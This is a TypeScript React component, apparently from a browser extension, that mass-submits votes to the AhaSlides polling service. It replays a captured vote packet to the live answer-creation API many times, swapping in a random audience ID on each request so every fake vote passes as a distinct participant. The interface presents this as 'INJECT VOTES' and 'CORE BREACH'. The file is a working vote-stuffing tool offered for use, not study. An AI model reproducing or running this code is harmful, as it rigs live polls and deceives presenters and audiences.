import React, { useState } from "react";
import { VotePayload } from "../../types";

/**
 * Định nghĩa các thuộc tính (props) cho component AhaSlides.
 * @param url - URL hiện tại của trang Ahaslides.
 * @param capturedJson - Gói tin JSON gần nhất đã được bắt, dùng làm mẫu.
 */
interface AhaSlidesProps {
  url: string;
  capturedJson: (VotePayload & { timestamp: number }) | null;
}

/**
 * Tạo ra một chuỗi định danh audience ngẫu nhiên gồm 32 ký tự.
 * Điều này là bắt buộc để mỗi lượt bình chọn được xem là duy nhất.
 * @returns Một chuỗi định danh ngẫu nhiên.
 */
function generateRandomAudienceId(): string {
  const chars = "0123456789abcdef";
  let result = "";
  for (let i = 0; i < 32; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return result;
}

/**
 * Component chính để xử lý logic cho tên miền ahaslides.com.
 * Component này hiển thị giao diện để gửi hàng loạt các lượt bình chọn
 * dựa trên một gói tin đã được bắt trước đó.
 */
const AhaSlides: React.FC<AhaSlidesProps> = ({ url, capturedJson }) => {
  const [voteCount, setVoteCount] = useState(10);
  const [isSending, setIsSending] = useState(false);
  const [statusMessage, setStatusMessage] = useState("");

  const urlParts = url.split("/");
  const ahaslidesId = urlParts[urlParts.length - 1];

  /**
   * Xử lý việc gửi hàng loạt các yêu cầu bình chọn đến máy chủ Ahaslides.
   */
  const handleSendVotes = async () => {
    // Ngăn chặn việc gửi nếu chưa có gói tin mẫu hoặc đang trong quá trình gửi
    if (!capturedJson || isSending) {
      if (!capturedJson) {
        setStatusMessage(
          "Chưa có gói tin nào được bắt. Vui lòng thực hiện một bình chọn trong trình duyệt để bắt đầu."
        );
      }
      return;
    }

    setIsSending(true);
    setStatusMessage(`Đang chuẩn bị gửi ${voteCount} lượt bình chọn...`);

    const apiUrl = "https://audience.ahaslides.com/api/answer/create";
    let successfulVotes = 0;
    const errors: string[] = [];

    for (let i = 0; i < voteCount; i++) {
      // Sao chép toàn bộ gói tin mẫu đã bắt được.
      const payload: VotePayload = {
        ...capturedJson,
        // Ghi đè các trường cần thiết để đảm bảo yêu cầu là duy nhất
        audience: generateRandomAudienceId(),
        slideTimestamp: Date.now().toString(),
      };

      // Xóa trường timestamp của ứng dụng (nếu có) để tránh gửi dữ liệu thừa
      delete payload.timestamp;

      try {
        const response = await fetch(apiUrl, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify(payload),
        });

        if (response.ok) {
          successfulVotes++;
        } else {
          const errorText = await response.text();
          errors.push(`Lỗi ${response.status}: ${errorText}`);
        }
        setStatusMessage(
          `Đã gửi ${i + 1}/${voteCount} lượt... Thành công: ${successfulVotes}`
        );
      } catch (error) {
        if (error instanceof Error) {
          errors.push(`Lỗi mạng: ${error.message}`);
        } else {
          errors.push(`Lỗi không xác định: ${String(error)}`);
        }
      }

      await new Promise((resolve) => setTimeout(resolve, 50));
    }

    let finalMessage = `Hoàn thành! Gửi thành công ${successfulVotes}/${voteCount} phiếu.`;
    if (errors.length > 0) {
      finalMessage += `\n\nChi tiết một số lỗi (tối đa 5):\n${errors
        .slice(0, 5)
        .join("\n")}`;
    }

    setStatusMessage(finalMessage);
    setIsSending(false);
  };

  return (
    <div
      style={{
        backgroundColor: "#000",
        color: "#00FF00",
        fontFamily: 'Consolas, Monaco, "Courier New", Courier, monospace',
        padding: "20px",
        // *** THAY ĐỔI CHÍNH ***
        height: "100vh", // Chiếm 100% chiều cao của khung nhìn (viewport)
        boxSizing: "border-box", // Đảm bảo padding và border không làm tăng kích thước tổng
        display: "flex",
        flexDirection: "column",
        border: "2px solid #00FF00",
        borderRadius: "5px",
      }}
    >
      <h2 style={{ color: "#00FFFF", marginBottom: "15px" }}>
        :: AHA SLIDES - CORE BREACH ::
      </h2>
      <p style={{ marginBottom: "10px", color: "#0F0" }}>
        <strong style={{ color: "#00FF00" }}>&#x23; ROOM ID:</strong>{" "}
        <span style={{ color: "#98FB98" }}>{ahaslidesId}</span>
      </p>

      {capturedJson ? (
        <>
          <h4 style={{ color: "#00FF00", marginBottom: "10px" }}>
            &#x23; CAPTURED PACKET (EMULATED):
          </h4>
          <pre
            style={{
              maxHeight: "500px",
              overflowY: "auto",
              backgroundColor: "#111",
              color: "#00FF00",
              padding: "10px",
              borderRadius: "4px",
              border: "1px solid #00FF00",
              wordBreak: "break-all",
              whiteSpace: "pre-wrap",
              fontSize: "0.9em",
            }}
          >
            {JSON.stringify(capturedJson, null, 2)}
          </pre>
          <div style={{ marginTop: "20px", marginBottom: "15px" }}>
            <label
              htmlFor="vote-count"
              style={{ color: "#0F0", marginRight: "10px" }}
            >
              <strong style={{ color: "#00FF00" }}>&#x23; VOTE COUNT:</strong>
            </label>
            <input
              id="vote-count"
              type="number"
              value={voteCount}
              onChange={(e) => setVoteCount(parseInt(e.target.value, 10) || 1)}
              min="1"
              disabled={isSending}
              style={{
                marginLeft: "10px",
                width: "60px",
                padding: "5px",
                backgroundColor: "#222",
                color: "#00FF00",
                border: "1px solid #00FF00",
                borderRadius: "3px",
                fontFamily:
                  'Consolas, Monaco, "Courier New", Courier, monospace',
                fontSize: "0.9em",
              }}
            />
          </div>
          <button
            onClick={handleSendVotes}
            disabled={isSending}
            style={{
              padding: "10px 20px",
              backgroundColor: isSending ? "#222" : "#00FF00",
              color: "#000",
              border: "none",
              borderRadius: "3px",
              cursor: isSending ? "not-allowed" : "pointer",
              fontFamily: 'Consolas, Monaco, "Courier New", Courier, monospace',
              fontSize: "0.9em",
              transition: "background-color 0.3s ease",
            }}
          >
            {isSending ? ">> HACKING IN PROGRESS..." : ">> INJECT VOTES"}
          </button>
        </>
      ) : (
        <p
          style={{
            color: "#0F0",
            fontStyle: "italic",
            flexGrow: 1,
            display: "flex",
            alignItems: "center",
            justifyContent: "center",
          }}
        >
          &#x23; WAITING FOR PACKET SNIFF... <br />
          &#x23; INITIATE VOTE ON AHASLIDES TO BEGIN.
        </p>
      )}

      {statusMessage && (
        <div
          style={{
            marginTop: "25px",
            padding: "10px",
            border: "1px dashed #00FF00",
            borderRadius: "4px",
            backgroundColor: "#111",
            color: "#00FF00",
            fontSize: "0.85em",
            whiteSpace: "pre-wrap",
            // Cho phép khối này mở rộng nếu cần
            flexGrow: 1,
            overflowY: "auto",
          }}
        >
          <strong style={{ color: "#00FFFF" }}>&#x23; STATUS:</strong>
          <p style={{ margin: "5px 0 0", color: "#98FB98" }}>{statusMessage}</p>
        </div>
      )}
    </div>
  );
};

export default AhaSlides;
